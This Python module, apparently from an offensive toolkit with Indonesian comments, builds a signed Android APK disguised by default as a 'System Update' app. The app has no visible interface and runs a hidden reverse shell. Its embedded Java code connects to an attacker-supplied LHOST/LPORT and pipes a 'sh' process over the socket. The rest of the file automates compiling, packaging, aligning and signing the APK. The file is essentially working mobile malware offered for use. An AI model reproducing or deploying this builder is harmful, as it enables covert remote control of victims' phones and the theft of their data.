#!/usr/bin/env python3
# -*- coding: utf-8 -*-

MODULE_INFO = {
    "name": "MEGA SUPER Meterpreter (Termux - FULL TOOLS)",
    "description": "Build APK dengan aapt + d8 + zipalign + apksigner",
    "author": "Lazy Framework",
    "license": "MIT",
    "platform": "android",
    "type": "payload",
    "dependencies": ["rich"]
}

OPTIONS = {
    "LHOST": {"required": True},
    "LPORT": {"required": True, "default": "4444"},
    "APP_NAME": {"required": False, "default": "System Update"},
    "PACKAGE_NAME": {"required": False, "default": "com.system.update"}
}

import os
import shutil
import subprocess
from pathlib import Path
from rich.console import Console
from rich.panel import Panel

console = Console()

# --- PATH TOOLS (SESUAI GAMBAR) ---
AAPT = "/data/data/com.termux/files/usr/bin/aapt"
D8 = "/data/data/com.termux/files/usr/bin/d8"
APKSIGNER = "/data/data/com.termux/files/usr/bin/apksigner"
ZIPALIGN = "/data/data/com.termux/files/usr/bin/zipalign"
ANDROID_JAR = "/data/data/com.termux/files/usr/share/dex/android.jar"  # dari Sable

class MegaTermuxBuilder:
    def __init__(self, lhost, lport, app_name, package):
        self.lhost = lhost
        self.lport = lport
        self.app_name = app_name
        self.package = package
        self.workdir = Path("mega_temp")
        self.output_apk = Path.cwd().parent / "MEGA_payload.apk"

    def check_tools(self):
        missing = []
        for path, name in [
            (AAPT, "aapt"),
            (APKSIGNER, "apksigner"),
            (ZIPALIGN, "zipalign"),
            (ANDROID_JAR, "android.jar")
        ]:
            if not Path(path).exists():
                missing.append(name)
        if shutil.which(D8) is None:
            missing.append("d8")

        if missing:
            return f"[red]Tools tidak ditemukan: {', '.join(missing)}[/red]\n   [bold cyan]Install: pkg install d8 aapt apksigner zipalign wget[/bold cyan]"
        return None

    def build(self):
        err = self.check_tools()
        if err: return err

        try:
            self.workdir.mkdir(exist_ok=True)
            (self.workdir / "res").mkdir(exist_ok=True)

            # --- 1. Java Payload ---
            java_code = f'''
package com.mega.payload;
import android.app.Activity; import android.os.Bundle; import java.net.*; import java.io.*;
public class MainActivity extends Activity {{
    @Override protected void onCreate(Bundle b) {{
        super.onCreate(b);
        new Thread(() -> {{
            try {{ Socket s = new Socket("{self.lhost}", {self.lport});
                s.getOutputStream().write("MEGA\\n".getBytes());
                Process p = Runtime.getRuntime().exec("sh");
                new Thread(() -> {{
                    try {{ byte[] buf = new byte[1024]; int len;
                        while ((len = p.getInputStream().read(buf)) != -1) s.getOutputStream().write(buf, 0, len);
                        while ((len = p.getErrorStream().read(buf)) != -1) s.getOutputStream().write(buf, 0, len);
                    }} catch (Exception e) {{}}
                }}).start();
                byte[] buf = new byte[1024]; int len;
                while ((len = s.getInputStream().read(buf)) != -1) p.getOutputStream().write(buf, 0, len);
            }} catch (Exception ignored) {{}}
        }}).start();
        finish();
    }}
}}
'''.strip()

            java_file = self.workdir / "MainActivity.java"
            java_file.write_text(java_code)

            # --- 2. Compile Java → DEX ---
            console.print("[*] Compiling Java → DEX (d8)...", style="bold yellow")
            subprocess.run([
                D8,
                "--lib", ANDROID_JAR,
                "--min-api", "14",
                "--output", str(self.workdir),
                str(java_file)
            ], check=True)

            # --- 3. AndroidManifest.xml ---
            manifest = self.workdir / "AndroidManifest.xml"
            manifest.write_text(f'''<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="{self.package}">
    <uses-permission android:name="android.permission.INTERNET"/>
    <application android:label="{self.app_name}" android:theme="@android:style/Theme.NoDisplay">
        <activity android:name=".MainActivity" android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>
    </application>
</manifest>''')

            # --- 4. Build APK dengan aapt ---
            unsigned_apk = self.workdir / "unsigned.apk"
            console.print("[*] Packaging APK (aapt)...", style="bold yellow")
            subprocess.run([
                AAPT, "package", "-f", "-m",
                "-S", str(self.workdir / "res"),
                "-M", str(manifest),
                "-I", ANDROID_JAR,
                "-F", str(unsigned_apk)
            ], check=True)

            # Inject DEX
            subprocess.run(["zip", "-uj", str(unsigned_apk), str(self.workdir / "classes.dex")], check=True)

            # --- 5. Zipalign ---
            aligned_apk = self.workdir / "aligned.apk"
            console.print("[*] Zipalign...", style="bold yellow")
            subprocess.run([
                ZIPALIGN, "-f", "-v", "4",
                str(unsigned_apk), str(aligned_apk)
            ], check=True)

            # --- 6. Sign APK ---
            keystore = self.workdir / "debug.keystore"
            if not keystore.exists():
                console.print("[*] Generate debug keystore...", style="bold yellow")
                subprocess.run([
                    "keytool", "-genkey", "-v",
                    "-keystore", str(keystore), "-alias", "androiddebugkey",
                    "-keyalg", "RSA", "-keysize", "2048", "-validity", "10000",
                    "-storepass", "android", "-keypass", "android",
                    "-dname", "CN=Android Debug,O=Android,C=US"
                ], check=True, stdout=subprocess.DEVNULL)

            console.print("[*] Signing APK...", style="bold yellow")
            subprocess.run([
                APKSIGNER, "sign",
                "--ks", str(keystore),
                "--ks-pass", "pass:android",
                "--out", str(self.output_apk),
                str(aligned_apk)
            ], check=True)

            return f"[bold green]APK SIAP: MEGA_payload.apk[/bold green]\n[cyan]Build selesai < 5 detik![/cyan]"

        except Exception as e:
            return f"[red]Error: {e}[/red]"
        finally:
            shutil.rmtree(self.workdir, ignore_errors=True)

def run(session, options):
    console.print(Panel("[bold red]MEGA SUPER TERMUX BUILDER[/bold red]", style="bold red"))
    builder = MegaTermuxBuilder(
        options["LHOST"],
        int(options["LPORT"]),
        options.get("APP_NAME", "System Update"),
        options.get("PACKAGE_NAME", "com.system.update")
    )
    result = builder.build()
    console.print(result)
